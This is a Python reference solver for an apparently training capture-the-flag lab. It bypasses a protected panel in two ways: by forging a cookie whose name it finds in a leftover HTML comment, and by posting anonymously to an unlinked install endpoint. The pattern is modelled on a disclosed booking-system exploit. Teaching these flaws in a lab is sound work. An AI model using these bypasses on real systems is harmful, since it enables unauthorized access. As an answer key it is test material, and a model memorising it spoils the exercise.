#!/usr/bin/env python3
"""Operation 05 reference solver — Blitz ghosts past Aruni's gate.

Two INDEPENDENT bypasses of the same protected panel, modeled on a real disclosed
pattern (Online Airline Booking System, EDB-ID 39167). Neither path requires
guessing a cookie name out of thin air -- each DISCOVERS it a different way,
exactly like a real tester would:

  Path A -- view-source the denial page. A leftover developer comment names the
  exact cookie the check relies on. Forge that cookie and request the panel
  directly -- no other endpoint needed at all.

  Path B -- find the leftover, unlinked provisioning endpoint via forced browsing
  and POST to it. Its response's Set-Cookie header hands you the same cookie
  legitimately, no credentials required to reach it either.

Both are run so you can see they're genuinely separate findings, not one bug
wearing two names -- and that neither one is a blind guess.

Usage: python3 op5.py [base_url]     (default http://localhost:8000)
"""
import sys, re, requests

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000").rstrip("/")


def path_a_discover_and_forge_cookie():
    print("[*] Path A: view-source the denial page, looking for what it actually checks")
    denied = requests.get(f"{BASE}/op5/panel")
    m = re.search(r"legacy check \(raw\s+(\w+)\s+cookie presence\)", denied.text)
    if not m:
        print("[!] couldn't find the leftover dev comment -- has the page changed?")
        return False
    cookie_name = m.group(1)
    print(f'[*] found it in an HTML comment: relies on a raw "{cookie_name}" cookie')

    r = requests.get(f"{BASE}/op5/panel", cookies={cookie_name: "yes"})
    flag = re.search(r"R6S\{[^}]*\}", r.text)
    if flag:
        print(f"[+] Path A worked by forging the discovered cookie: {flag.group(0)}")
        return True
    print("[!] Path A failed even after discovering the cookie name")
    return False


def path_b_leftover_installer():
    print("\n[*] Path B: forced-browsing style — try the leftover installer endpoint")
    sess = requests.Session()
    r = sess.post(f"{BASE}/op5/install", data={"callsign": "backdoor.op"})
    if "Provisioning complete" not in r.text:
        print("[!] installer endpoint didn't behave as expected")
        return False
    cookie_name = next(iter(sess.cookies.keys()), None)
    print(f'[*] installer accepted an anonymous POST and Set-Cookie handed back "{cookie_name}"')
    console = sess.get(f"{BASE}/op5/panel")
    flag = re.search(r"R6S\{[^}]*\}", console.text)
    if flag:
        print(f"[+] Path B worked via the unlinked /op5/install endpoint: {flag.group(0)}")
        return True
    print("[!] Path B failed to reach the panel afterward")
    return False


def main():
    a_ok = path_a_discover_and_forge_cookie()
    b_ok = path_b_leftover_installer()
    if a_ok or b_ok:
        print("\n[+] Operation 05 cleared. Operation 06 is now unlocked at Command.")
    else:
        print("\n[!] Neither path succeeded — check the app is running and reachable.")


if __name__ == "__main__":
    main()
